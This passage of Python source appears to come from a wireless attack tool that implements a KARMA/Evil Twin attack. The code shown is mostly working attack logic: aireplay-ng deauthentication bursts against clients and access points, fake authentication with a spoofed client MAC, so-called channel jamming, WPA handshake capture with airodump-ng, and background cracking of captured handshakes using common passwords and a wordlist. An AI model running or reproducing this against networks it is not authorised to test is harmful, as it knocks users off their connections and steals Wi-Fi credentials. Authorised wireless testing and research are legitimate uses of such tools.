                'admin', 'default', 'router', 'modem', 'attwifi', 'xfinitywifi',
                'Verizon_WiFi', 'SpectrumWiFi', 'CoxWiFi', 'CenturyLinkWiFi'
            }
            
            Color.pl('{+} {G}Fallback PNL created with {C}%d{W} common SSIDs{W}' % len(self.pnl_networks))
            
            # Use existing real_networks if available, don't scan again
            if hasattr(self, 'real_networks') and self.real_networks:
                Color.pl('{+} {G}Using existing real networks from previous scan{W}')
                Color.pl('{+} {G}Found {C}%d{W} real networks with clients{W}' % len(self.real_networks))
            else:
                # Check if we already scanned but found no networks with clients
                if hasattr(self, '_networks_scanned') and self._networks_scanned:
                    Color.pl('{+} {G}Using fallback PNL - previous scan found networks but no clients{W}')
                    Color.pl('{+} {G}Fallback mode will create Evil Twins for common SSIDs{W}')
                else:
                    # Only scan if we haven't scanned yet
                    Color.pl('{+} {C}No previous scan found - scanning for networks...{W}')
                    if not self.identify_real_networks():
                        Color.pl('{!} {R}Still no real networks found in fallback mode{W}')
                        return False
            
            # Mark as fallback mode
            self.fallback_mode = True
            Color.pl('{+} {G}Fallback attack mode activated successfully{W}')
            return True
            
        except Exception as e:
            Color.pl('{!} {R}Fallback attack mode failed: {O}%s{W}' % str(e))
            return False
    
    def cleanup_and_restore_interfaces(self):
        """Clean up interfaces and restore them to working state"""
        try:
            Color.pl('{+} {C}Cleaning up interfaces and restoring network...{W}')
            
            # Stop all processes
            self.stop_all_processes()
            
            # Restore interfaces to managed mode
            interfaces_to_restore = []
            if hasattr(self, 'probe_interface') and self.probe_interface:
                interfaces_to_restore.append(self.probe_interface)
            if hasattr(self, 'rogue_interface') and self.rogue_interface:
                interfaces_to_restore.append(self.rogue_interface)
            
            for iface in interfaces_to_restore:
                try:
                    # Clean up interface name - convert monitor interfaces to base interfaces
                    base_iface = self.cleanup_interface_name(iface)
                    
                    Color.pl('{+} {C}Restoring interface {G}%s{W} to managed mode...{W}' % base_iface)
                    
                    # Bring interface down
                    subprocess.run(['ip', 'link', 'set', base_iface, 'down'], capture_output=True)
                    
                    # Set to managed mode
                    subprocess.run(['iw', 'dev', base_iface, 'set', 'type', 'managed'], capture_output=True)
                    
                    # Flush IP addresses
                    subprocess.run(['ip', 'addr', 'flush', 'dev', base_iface], capture_output=True)
                    
                    # Bring interface up
                    subprocess.run(['ip', 'link', 'set', base_iface, 'up'], capture_output=True)
                    
                    Color.pl('{+} {G}Interface {G}%s{W} restored to managed mode{W}' % base_iface)
                    
                except Exception as e:
                    Color.pl('{!} {O}Warning: Failed to restore interface {G}%s{W}: {R}%s{W}' % (base_iface, str(e)))
            
            # Unblock rfkill
            try:
                subprocess.run(['rfkill', 'unblock', 'all'], capture_output=True)
                Color.pl('{+} {G}Unblocked all rfkill devices{W}')
            except Exception as e:
                Color.pl('{!} {R}Failed to unblock rfkill: {O}%s{W}' % str(e))
            
            # Restart network services
            try:
                subprocess.run(['systemctl', 'restart', 'NetworkManager'], capture_output=True)
                Color.pl('{+} {G}Restarted NetworkManager{W}')
            except Exception as e:
                Color.pl('{!} {O}Warning: Failed to restart NetworkManager: {R}%s{W}' % str(e))
            
            Color.pl('{+} {G}Interface cleanup and restoration complete{W}')
            
        except Exception as e:
            Color.pl('{!} {R}Error during interface cleanup: {O}%s{W}' % str(e))
    
    def stop_all_processes(self):
        """Stop all running processes"""
        try:
            # Kill hostapd processes
            subprocess.run(['pkill', '-f', 'hostapd'], capture_output=True)
            
            # Kill dnsmasq processes
            subprocess.run(['pkill', '-f', 'dnsmasq'], capture_output=True)
            
            # Kill airodump processes
            subprocess.run(['pkill', '-f', 'airodump'], capture_output=True)
            
            # Kill aireplay processes
            subprocess.run(['pkill', '-f', 'aireplay'], capture_output=True)
            
            Color.pl('{+} {G}Stopped all attack processes{W}')
            
        except Exception as e:
            Color.pl('{!} {O}Warning: Error stopping processes: {R}%s{W}' % str(e))
    
    def send_adaptive_deauth(self, network, client, intensity):
        """Send adaptive deauth packets based on intensity level"""
        try:
            # Base deauth command
            deauth_cmd = [
                'aireplay-ng',
                '-0', str(intensity),  # Number of packets based on intensity
                '--ignore-negative-one',
                '-a', network.bssid,
                '-c', client.bssid,
                self.probe_interface
            ]
            
            # Execute with timeout and proper cleanup
            try:
                process = subprocess.Popen(deauth_cmd, 
                                         stdout=subprocess.DEVNULL, 
                                         stderr=subprocess.DEVNULL,
                                         preexec_fn=os.setsid)
                
                # Shorter timeout for higher intensity
                timeout = max(1, 3 - (intensity // 2))
                process.wait(timeout=timeout)
                
            except subprocess.TimeoutExpired:
                try:
                    os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                except:
                    pass
                process.kill()
            
            # For high intensity, also send broadcast deauth
            if intensity >= 5:
                broadcast_cmd = [
                    'aireplay-ng',
                    '-0', '2',
                    '--ignore-negative-one',
                    '-a', network.bssid,
                    self.probe_interface
                ]
                
                try:
                    process = subprocess.Popen(broadcast_cmd, 
                                             stdout=subprocess.DEVNULL, 
                                             stderr=subprocess.DEVNULL,
                                             preexec_fn=os.setsid)
                    process.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    try:
                        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                    except:
                        pass
                    process.kill()
            
            # For maximum intensity, try additional attack methods
            if intensity >= 7:
                self.try_fallback_attacks(network, client)
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Adaptive deauth failed: {O}%s{W}' % str(e))
    
    def try_fallback_attacks(self, network, client):
        """Try additional attack methods when standard deauth fails"""
        try:
            Color.pl('{+} {R}Trying fallback attacks for {G}%s{W} from {G}%s{W}' % 
                    (client.bssid, network.essid))
            
            # Method 1: Fake authentication then deauth
            fakeauth_cmd = [
                'aireplay-ng',
                '-1', '0',  # Fake authentication
                '-a', network.bssid,
                '-h', client.bssid,  # Spoof client MAC
                self.probe_interface
            ]
            
            try:
                process = subprocess.Popen(fakeauth_cmd, 
                                         stdout=subprocess.DEVNULL, 
                                         stderr=subprocess.DEVNULL,
                                         preexec_fn=os.setsid)
                process.wait(timeout=2)
            except subprocess.TimeoutExpired:
                try:
                    os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                except:
                    pass
                process.kill()
            
            # Method 2: Channel jamming
            self.jam_ap_channel(network)
            
            # Method 3: Multiple rapid deauth bursts
            for burst in range(3):
                rapid_deauth_cmd = [
                    'aireplay-ng',
                    '-0', '5',  # 5 packets per burst
                    '--ignore-negative-one',
                    '-a', network.bssid,
                    '-c', client.bssid,
                    self.probe_interface
                ]
                
                try:
                    process = subprocess.Popen(rapid_deauth_cmd, 
                                             stdout=subprocess.DEVNULL, 
                                             stderr=subprocess.DEVNULL,
                                             preexec_fn=os.setsid)
                    process.wait(timeout=1)
                except subprocess.TimeoutExpired:
                    try:
                        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                    except:
                        pass
                    process.kill()
                
                time.sleep(0.5)  # Short delay between bursts
            
            Color.pl('{+} {C}Fallback attacks completed for {G}%s{W}' % client.bssid)
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Fallback attacks failed: {O}%s{W}' % str(e))
    
    def send_comprehensive_deauth(self, network, client):
        """Send comprehensive deauth attack to force disconnection"""
        try:
            # Method 1: Direct client deauth (simplified to prevent overload)
            deauth_cmd = [
                'aireplay-ng',
                '-0', '2',  # Reduced to 2 deauth packets
                '--ignore-negative-one',
                '-a', network.bssid,  # Target AP
                '-c', client.bssid,  # Target client
                self.probe_interface
            ]
            
            # Execute with timeout and proper cleanup
            try:
                process = subprocess.Popen(deauth_cmd, 
                                         stdout=subprocess.DEVNULL, 
                                         stderr=subprocess.DEVNULL,
                                         preexec_fn=os.setsid)  # Create new process group
                
                # Wait for completion with timeout
                process.wait(timeout=3)
                
            except subprocess.TimeoutExpired:
                # Kill the process if it takes too long
                try:
                    os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                except:
                    pass
                process.kill()
            
            if Configuration.verbose > 1:
                Color.pl('{+} {C}Sent deauth to {G}%s{W} from {G}%s{W}' % 
                        (client.bssid, network.essid))
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Comprehensive deauth failed: {O}%s{W}' % str(e))
    
    def jam_ap_channel(self, network):
        """Jam the AP's channel to make fake AP more attractive"""
        try:
            # Use airodump to create interference on the channel
            jam_cmd = [
                'airodump-ng',
                '-c', str(network.channel),
                '--bssid', network.bssid,
                self.probe_interface
            ]
            
            # Run briefly to create channel interference
            subprocess.Popen(jam_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Channel jamming failed: {O}%s{W}' % str(e))
    
    def start_handshake_capture(self):
        """Start handshake capture for WPA/WPA2 networks"""
        Color.pl('\n{+} {C}Stage 5: Starting handshake capture{W}')
        
        try:
            self.handshake_capture_active = True
            
            Color.pl('{+} {C}Handshake capture active - monitoring for WPA handshakes{W}')
            
            # Start handshake capture thread
            handshake_thread = threading.Thread(target=self.monitor_handshakes)
            handshake_thread.daemon = True  # Consistent daemon setting
            handshake_thread.start()
            
            if hasattr(self, 'target') and self.target:
                Color.pattack('KARMA', self.target, 'Handshake Capture', 'Monitoring for WPA handshakes')
            
            return True
            
        except Exception as e:
            Color.pl('{!} {R}Error starting handshake capture: {O}%s{W}' % str(e))
            return False
    
    def check_loop_timeout(self, loop_name, max_iterations=None, max_seconds=None):
        """Check if a loop has exceeded its timeout limits"""
        try:
            current_time = time.time()
            
            # Initialize loop start time if not exists
            if loop_name not in self._loop_start_times:
                self._loop_start_times[loop_name] = current_time
            
            # Check time-based timeout
            if max_seconds is None:
                max_seconds = self.LOOP_TIMEOUT_SECONDS
            
            elapsed_time = current_time - self._loop_start_times[loop_name]
            if elapsed_time > max_seconds:
                Color.pl('{!} {R}Loop timeout exceeded for {O}%s{W}: {C}%.1f{W} seconds' % (loop_name, elapsed_time))
                return True
            
            # Check iteration-based timeout
            if max_iterations is None:
                max_iterations = self.MAX_MONITORING_ITERATIONS
            
            # This would need to be called with iteration count from the calling loop
            return False
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error checking loop timeout: {O}%s{W}' % str(e))
            return True
    
    def reset_loop_timer(self, loop_name):
        """Reset the timer for a specific loop"""
        try:
            self._loop_start_times[loop_name] = time.time()
        except Exception:
            pass
    
    def register_process(self, process_name, process_obj, timeout_seconds=None):
        """Register a process for tracking and cleanup"""
        try:
            with self._process_lock:
                self._process_registry[process_name] = {
                    'process': process_obj,
                    'start_time': time.time(),
                    'timeout': timeout_seconds or self.PROCESS_CLEANUP_TIMEOUT
                }
                Color.pl('{+} {C}Registered process: {G}%s{W}' % process_name)
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error registering process: {O}%s{W}' % str(e))
    
    def unregister_process(self, process_name):
        """Unregister a process from tracking"""
        try:
            with self._process_lock:
                if process_name in self._process_registry:
                    del self._process_registry[process_name]
                    Color.pl('{+} {C}Unregistered process: {G}%s{W}' % process_name)
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error unregistering process: {O}%s{W}' % str(e))
    
    def cleanup_all_processes(self):
        """Clean up all registered processes"""
        try:
            Color.pl('{+} {C}Starting comprehensive process cleanup...{W}')
            
            with self._process_lock:
                processes_to_cleanup = list(self._process_registry.items())
                self._process_registry.clear()
            
            # Clean up processes outside of lock to avoid deadlock
            for process_name, process_info in processes_to_cleanup:
                try:
                    process_obj = process_info['process']
                    timeout = process_info['timeout']
                    
                    if hasattr(process_obj, 'poll') and process_obj.poll() is None:
                        # Process is still running
                        Color.pl('{+} {C}Terminating process: {G}%s{W}' % process_name)
                        
                        # Try graceful termination first
                        if hasattr(process_obj, 'terminate'):
                            process_obj.terminate()
                        
                        # Wait for process to terminate (reduced timeout for faster cleanup)
                        try:
                            process_obj.wait(timeout=min(timeout, 3))  # Max 3 seconds per process
                            Color.pl('{+} {G}Process terminated gracefully: {C}%s{W}' % process_name)
                        except subprocess.TimeoutExpired:
                            # Force kill if graceful termination fails
                            Color.pl('{!} {R}Process did not terminate gracefully, force killing: {O}%s{W}' % process_name)
                            if hasattr(process_obj, 'kill'):
                                process_obj.kill()
                            process_obj.wait(timeout=1)  # Reduced to 1 second
                    else:
                        Color.pl('{+} {G}Process already terminated: {C}%s{W}' % process_name)
                        
                except Exception as e:
                    if Configuration.verbose > 1:
                        Color.pl('{!} {R}Error cleaning up process {O}%s{W}: {R}%s{W}' % (process_name, str(e)))
            
            Color.pl('{+} {G}Process cleanup completed{W}')
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error in process cleanup: {O}%s{W}' % str(e))
    
    def monitor_process_health(self):
        """Monitor health of registered processes"""
        try:
            with self._process_lock:
                current_time = time.time()
                unhealthy_processes = []
                
                for process_name, process_info in self._process_registry.items():
                    process_obj = process_info['process']
                    start_time = process_info['start_time']
                    timeout = process_info['timeout']
                    
                    # Check if process is still running
                    if hasattr(process_obj, 'poll'):
                        if process_obj.poll() is not None:
                            # Process has terminated
                            unhealthy_processes.append(process_name)
                        elif current_time - start_time > timeout * 10:  # 10x timeout threshold
                            # Process has been running too long
                            unhealthy_processes.append(process_name)
                
                # Clean up unhealthy processes
                for process_name in unhealthy_processes:
                    Color.pl('{!} {R}Unhealthy process detected: {O}%s{W}' % process_name)
                    del self._process_registry[process_name]
                    
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error monitoring process health: {O}%s{W}' % str(e))
    
    def acquire_interface_lock(self, interface, operation_name):
        """Acquire a lock for interface operations to prevent conflicts"""
        try:
            if interface not in self._interface_locks:
                self._interface_locks[interface] = threading.Lock()
            
            # Try to acquire lock with timeout
            acquired = self._interface_locks[interface].acquire(timeout=5)
            if acquired:
                self._interface_operations[interface] = {
                    'operation': operation_name,
                    'start_time': time.time(),
                    'thread_id': threading.get_ident()
                }
                Color.pl('{+} {C}Acquired interface lock for {G}%s{W}: {C}%s{W}' % (interface, operation_name))
                return True
            else:
                Color.pl('{!} {R}Failed to acquire interface lock for {O}%s{W}: {O}%s{W}' % (interface, operation_name))
                return False
                
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error acquiring interface lock: {O}%s{W}' % str(e))
            return False
    
    def release_interface_lock(self, interface):
        """Release interface lock and clean up operation tracking"""
        try:
            if interface in self._interface_locks:
                if interface in self._interface_operations:
                    operation_info = self._interface_operations[interface]
                    elapsed_time = time.time() - operation_info['start_time']
                    Color.pl('{+} {C}Released interface lock for {G}%s{W}: {C}%s{W} ({G}%.1f{W}s)' % 
                            (interface, operation_info['operation'], elapsed_time))
                    del self._interface_operations[interface]
                
                self._interface_locks[interface].release()
                
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error releasing interface lock: {O}%s{W}' % str(e))
    
    def check_interface_conflicts(self):
        """Check for interface conflicts and resolve them"""
        try:
            current_time = time.time()
            conflicted_interfaces = []
            
            for interface, operation_info in self._interface_operations.items():
                elapsed_time = current_time - operation_info['start_time']
                if elapsed_time > self.INTERFACE_OPERATION_TIMEOUT:
                    conflicted_interfaces.append(interface)
                    Color.pl('{!} {R}Interface operation timeout detected: {O}%s{W} ({C}%s{W})' % 
                            (interface, operation_info['operation']))
            
            # Resolve conflicts
            for interface in conflicted_interfaces:
                Color.pl('{!} {R}Resolving interface conflict: {O}%s{W}' % interface)
                self.release_interface_lock(interface)
                self._interface_conflict_detected = True
            
            return len(conflicted_interfaces) == 0
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error checking interface conflicts: {O}%s{W}' % str(e))
            return False
    
    def safe_interface_operation(self, interface, operation_name, operation_func, *args, **kwargs):
        """Safely execute interface operations with conflict resolution"""
        try:
            # Acquire interface lock
            if not self.acquire_interface_lock(interface, operation_name):
                return False
            
            try:
                # Execute the operation
                result = operation_func(*args, **kwargs)
                return result
            finally:
                # Always release the lock
                self.release_interface_lock(interface)
                
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error in safe interface operation: {O}%s{W}' % str(e))
            # Ensure lock is released even on error
            try:
                self.release_interface_lock(interface)
            except:
                pass
            return False
    
    def monitor_handshakes(self):
        """Monitor for WPA handshakes from connected clients - Thread-safe with timeout protection"""
        try:
            Color.pl('{+} {C}Starting thread-safe handshake monitoring with timeout protection...{W}')
            
            # Initialize timeout tracking
            self.reset_loop_timer('handshake_monitoring')
            
            # Initialize thread-safe data structures
            with self._lock:
                self.active_capture_threads = {}
                self.handshake_capture_queue = []
                self._capture_attempts = {}
            
            iteration_count = 0
            max_iterations = self.MAX_MONITORING_ITERATIONS
            
            while (self.handshake_capture_active and 
                   self.running and 
                   iteration_count < max_iterations and
                   not self.check_loop_timeout('handshake_monitoring', max_iterations, 300)):
                
                try:
                    iteration_count += 1
                    
                    # Log progress every 100 iterations
                    if iteration_count % 100 == 0:
                        Color.pl('{+} {C}Handshake monitoring iteration {G}%d{W}/{C}%d{W}' % (iteration_count, max_iterations))
                    
                    # Thread-safe client processing
                    with self._client_lock:
                        clients_to_process = []
                        if self.connected_clients:
                            for client_mac in list(self.connected_clients):
                                # Check if client needs handshake capture
                                if (client_mac not in self.captured_handshakes and 
                                    client_mac not in self.active_capture_threads and
                                    client_mac not in self.handshake_capture_queue):
                                    
                                    # Check capture attempt limits
                                    attempts = self._capture_attempts.get(client_mac, 0)
                                    if attempts < self.MAX_HANDSHAKES_PER_CLIENT:
                                        clients_to_process.append(client_mac)
                    
                    # Add clients to queue thread-safely
                    with self._capture_lock:
                        for client_mac in clients_to_process:
                            if client_mac not in self.handshake_capture_queue:
                                self.handshake_capture_queue.append(client_mac)
                                self._capture_attempts[client_mac] = self._capture_attempts.get(client_mac, 0) + 1
                    
                    # Process capture queue with limits
                    with self._capture_lock:
                        active_count = len(self.active_capture_threads)
                        queue_size = len(self.handshake_capture_queue)
                        
                        # Process queue respecting limits
                        while (active_count < self.MAX_CONCURRENT_CAPTURES and 
                               queue_size > 0 and 
                               self.handshake_capture_active and 
                               self.running):
                            
                            client_mac = self.handshake_capture_queue.pop(0)
                            queue_size -= 1
                            
                            # Start capture in separate thread
                            self.start_async_handshake_capture(client_mac)
                    
                    # Clean up completed capture threads
                    self.cleanup_completed_capture_threads()
                    
                    # Adaptive sleep based on activity
                    if queue_size > 0 or active_count > 0:
                        time.sleep(0.5)  # More frequent checks when active
                    else:
                        time.sleep(2)  # Less frequent when idle
                    
                except Exception as e:
                    if Configuration.verbose > 1:
                        Color.pl('{!} {R}Error in handshake monitoring loop: {O}%s{W}' % str(e))
                    time.sleep(2)
            
            # Check why loop ended
            if iteration_count >= max_iterations:
                Color.pl('{!} {R}Handshake monitoring stopped: maximum iterations reached ({C}%d{W})' % max_iterations)
            elif self.check_loop_timeout('handshake_monitoring'):
                Color.pl('{!} {R}Handshake monitoring stopped: timeout exceeded')
            else:
                Color.pl('{+} {G}Handshake monitoring stopped normally{W}')
                
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error monitoring handshakes: {O}%s{W}' % str(e))
        finally:
            # Cleanup all active capture threads
            self.cleanup_all_capture_threads()
            Color.pl('{+} {G}Handshake monitoring stopped safely{W}')
    
    def start_async_handshake_capture(self, client_mac):
        """Start asynchronous handshake capture for a client - Thread-safe implementation"""
        try:
            # Thread-safe thread creation and tracking
            with self._capture_lock:
                # Double-check if client is already being processed
                if client_mac in self.active_capture_threads:
                    return
                
                # Create capture thread
                capture_thread = threading.Thread(
                    target=self.async_capture_handshake_for_client,
                    args=(client_mac,),
                    name=f'handshake_capture_{client_mac.replace(":", "")}'
                )
                capture_thread.daemon = True
                
                # Track the thread
                self.active_capture_threads[client_mac] = {
                    'thread': capture_thread,
                    'start_time': time.time(),
                    'status': 'starting'
                }
                
                capture_thread.start()
                Color.pl('{+} {C}Started thread-safe handshake capture for {G}%s{W}' % client_mac)
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error starting async handshake capture: {O}%s{W}' % str(e))
            # Remove from active threads if failed to start
            with self._capture_lock:
                if client_mac in self.active_capture_threads:
                    del self.active_capture_threads[client_mac]
    
    def async_capture_handshake_for_client(self, client_mac):
        """Asynchronous handshake capture for a specific client - Fixed implementation"""
        try:
            # Update thread status
            if client_mac in self.active_capture_threads:
                self.active_capture_threads[client_mac]['status'] = 'capturing'
            
            Color.pl('{+} {C}Starting handshake capture for {G}%s{W}...' % client_mac)
            
            # Get the AP BSSID for this client (CRITICAL FIX)
            ap_bssid = self.get_ap_bssid_for_client(client_mac)
            if not ap_bssid:
                Color.pl('{!} {R}No AP found for client {O}%s{W}' % client_mac)
                return
            
            Color.pl('{+} {C}Targeting AP {G}%s{W} for client {G}%s{W}' % (ap_bssid, client_mac))
            
            # Send deauth to trigger handshake (CRITICAL FIX)
            self.trigger_handshake_with_deauth(ap_bssid, client_mac)
            
            # Use safe interface operation for airodump
            def capture_operation():
                with Airodump(interface=self.probe_interface,
                             target_bssid=ap_bssid,  # FIXED: Use AP BSSID, not client MAC
                             output_file_prefix='karma_handshake_%s' % client_mac.replace(':', ''),
                             delete_existing_files=True) as airodump:
                    
                    # Monitor for handshake with extended timeout
                    timer = Timer(60)  # Increased timeout for better success rate
                    handshake_found = False
                    last_check_time = time.time()
                    
                    while not timer.ended() and not handshake_found and self.running:
                        # Check if handshake was captured
                        cap_files = airodump.find_files(endswith='.cap')
                        if cap_files:
                            # Use async validation to prevent blocking
                            if self.validate_handshake_async(cap_files[0]):
                                self.captured_handshakes[client_mac] = cap_files[0]
                                Color.pl('{+} {G}WPA handshake captured from {C}%s{W}!' % client_mac)
                                handshake_found = True
                                
                                # Attempt to crack the handshake asynchronously
                                self.crack_handshake_async(client_mac, cap_files[0])
                        
                        # Adaptive sleep based on activity
                        current_time = time.time()
                        if current_time - last_check_time > 5:  # No activity for 5 seconds
                            time.sleep(0.5)  # Check more frequently
                        else:
                            time.sleep(1)  # Normal check interval
                        
                        last_check_time = current_time
                    
                    if not handshake_found:
                        Color.pl('{!} {R}No handshake captured from {O}%s{W} after 60 seconds' % client_mac)
                        # Retry handshake capture after a delay
                        self.retry_handshake_capture(client_mac)
                    
                    return handshake_found
            
            # Execute capture operation safely
            handshake_found = self.safe_interface_operation(
                self.probe_interface, 
                f'handshake_capture_{client_mac}', 
                capture_operation
            )
                    
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error in async handshake capture: {O}%s{W}' % str(e))
        finally:
            # Update thread status to completed
            if client_mac in self.active_capture_threads:
                self.active_capture_threads[client_mac]['status'] = 'completed'
    
    def capture_handshake_for_client(self, client_mac):
        """Legacy method - redirects to async implementation"""
        self.start_async_handshake_capture(client_mac)
    
    def _get_rogue_ap_bssid(self):
        """Get the BSSID of our rogue AP"""
        try:
            # Get the MAC address of our rogue interface
            cmd = ['ip', 'link', 'show', self.rogue_interface]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            
            if result.returncode == 0:
                # Extract MAC address from ip link output
                for line in result.stdout.split('\n'):
                    if 'link/ether' in line:
                        mac_match = re.search(r'([a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2})', line)
                        if mac_match:
                            return mac_match.group(1).lower()
            
            # Fallback: try to get from hostapd config if available
            if hasattr(self, 'hostapd_config') and self.hostapd_config:
                try:
                    with open(self.hostapd_config, 'r') as f:
                        content = f.read()
                        bssid_match = re.search(r'bssid=([a-fA-F0-9:]{17})', content)
                        if bssid_match:
                            return bssid_match.group(1).lower()
                except Exception:
                    pass
            
            return None
            
        except Exception:
            return None
    
    def retry_handshake_capture(self, client_mac):
        """Retry handshake capture for a client after a delay"""
        try:
            # Wait 30 seconds before retry
            time.sleep(30)
            
            # Check if client is still connected
            if client_mac in self.connected_clients and client_mac not in self.captured_handshakes:
                Color.pl('{+} {C}Retrying handshake capture for {G}%s{W}...' % client_mac)
                
                # Retry with more aggressive deauth
                rogue_bssid = self._get_rogue_ap_bssid()
                if rogue_bssid:
                    # Send more deauth packets to force reconnection
                    deauth_cmd = [
                        'aireplay-ng',
                        '-0', '10',  # Send 10 deauth packets
                        '--ignore-negative-one',
                        '-a', rogue_bssid,
                        '-c', client_mac,
                        self.probe_interface
                    ]
                    
                    try:
                        process = subprocess.Popen(deauth_cmd, 
                                                 stdout=subprocess.DEVNULL, 
                                                 stderr=subprocess.DEVNULL,
                                                 preexec_fn=os.setsid)
                        process.wait(timeout=10)
                    except subprocess.TimeoutExpired:
                        try:
                            os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                        except:
                            pass
                        process.kill()
                    
                    # Wait for reconnection
                    time.sleep(5)
                    
                    # Try handshake capture again
                    self.capture_handshake_for_client(client_mac)
                    
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error in retry handshake capture: {O}%s{W}' % str(e))
    
    def validate_handshake_async(self, capfile):
        """Validate handshake asynchronously to prevent blocking - Fixed implementation"""
        try:
            # Use timeout to prevent blocking
            cmd = ['aircrack-ng', capfile]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            
            # More robust handshake detection
            output = result.stdout.lower()
            return ('wpa' in output and 'handshake' in output) or '1 handshake' in output
            
        except subprocess.TimeoutExpired:
            if Configuration.verbose > 1:
                Color.pl('{!} {O}Handshake validation timeout for {C}%s{W}' % capfile)
            return False
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error validating handshake: {O}%s{W}' % str(e))
            return False
    
    def get_ap_bssid_for_client(self, client_mac):
        """Get the AP BSSID for a specific client - CRITICAL FIX"""
        try:
            # In KARMA attack, clients connect to our rogue AP
            # Get the BSSID of our rogue interface
            rogue_bssid = self._get_rogue_ap_bssid()
            if rogue_bssid:
                Color.pl('{+} {C}Client {G}%s{W} connected to our rogue AP {G}%s{W}' % (client_mac, rogue_bssid))
                return rogue_bssid
            
            # Fallback: check real networks for this client
            if hasattr(self, 'real_networks') and self.real_networks:
                for network in self.real_networks:
                    if hasattr(network, 'clients'):
                        for client in network.clients:
                            if client.bssid == client_mac:
                                return network.bssid
            
            # Last resort: scan for APs with this client
            return self.scan_for_ap_with_client(client_mac)
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error getting AP BSSID for client: {O}%s{W}' % str(e))
            return None
    
    def scan_for_ap_with_client(self, client_mac):
        """Scan for APs that have the specified client"""
        try:
            # Quick scan to find APs with this client
            cmd = ['airodump-ng', self.probe_interface, '--bssid', client_mac, '--write', '/tmp/scan_temp', '--output-format', 'csv']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            
            # Parse output to find AP BSSID
            lines = result.stdout.split('\n')
            for line in lines:
                if client_mac in line and ',' in line:
                    parts = line.split(',')
                    if len(parts) > 1:
                        return parts[0].strip()
            
            return None
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error scanning for AP with client: {O}%s{W}' % str(e))
            return None
    
    def trigger_handshake_with_deauth(self, ap_bssid, client_mac):
        """Send deauth frames to trigger handshake - CRITICAL FIX"""
        try:
            Color.pl('{+} {C}Sending deauth to trigger handshake: AP {G}%s{W} -> Client {G}%s{W}' % (ap_bssid, client_mac))
            
            # Send deauth from AP to client
            deauth_cmd = ['aireplay-ng', '-0', '3', '-a', ap_bssid, '-c', client_mac, self.probe_interface]
            subprocess.run(deauth_cmd, capture_output=True, timeout=5)
            
            # Small delay to let deauth take effect
            time.sleep(1)
            
            # Send deauth from client to AP (reverse direction)
            deauth_cmd_reverse = ['aireplay-ng', '-0', '2', '-a', ap_bssid, '-c', client_mac, self.probe_interface]
            subprocess.run(deauth_cmd_reverse, capture_output=True, timeout=5)
            
            Color.pl('{+} {G}Deauth frames sent successfully{W}')
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error sending deauth frames: {O}%s{W}' % str(e))
    
    def crack_handshake_async(self, client_mac, handshake_file):
        """Attempt to crack captured WPA handshake asynchronously"""
        try:
            # Start cracking in background thread
            crack_thread = threading.Thread(
                target=self._crack_handshake_worker,
                args=(client_mac, handshake_file),
                name=f'crack_handshake_{client_mac.replace(":", "")}'
            )
            crack_thread.daemon = True
            crack_thread.start()
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error starting async handshake cracking: {O}%s{W}' % str(e))
    
    def _crack_handshake_worker(self, client_mac, handshake_file):
        """Worker thread for handshake cracking"""
        try:
            Color.pl('{+} {C}Starting background cracking for {G}%s{W}...' % client_mac)
            
            # Try common passwords first
            common_passwords = [
                '12345678', 'password', 'admin', '1234567890',
                'qwerty123', 'password123', '123456789', 'admin123',
                'welcome', '12345', '123456', 'password1'
            ]
            
            for password in common_passwords:
                if not self.running:  # Check if attack is still running
                    break
                    
                if self.try_password_async(handshake_file, password):
                    self.cracked_passwords[client_mac] = password
                    Color.pl('{+} {G}PASSWORD CRACKED for {C}%s{W}: {R}%s{W}' % (client_mac, password))
                    
                    if hasattr(self, 'target') and self.target:
                        Color.pattack('KARMA', self.target, 'Password Cracked', f'{client_mac}: {password}')
                    return True
            
            # Try wordlist if available
            wordlist_file = getattr(Configuration, 'wordlist', None)
            if wordlist_file and os.path.exists(wordlist_file) and self.running:
                Color.pl('{+} {C}Trying wordlist attack for {G}%s{W}...' % client_mac)
                if self.try_wordlist_attack_async(handshake_file, wordlist_file):
                    Color.pl('{+} {G}Password found in wordlist for {C}%s{W}' % client_mac)
                    return True
            
            Color.pl('{!} {R}Could not crack password for {O}%s{W}' % client_mac)
            return False
            
        except Exception as e:
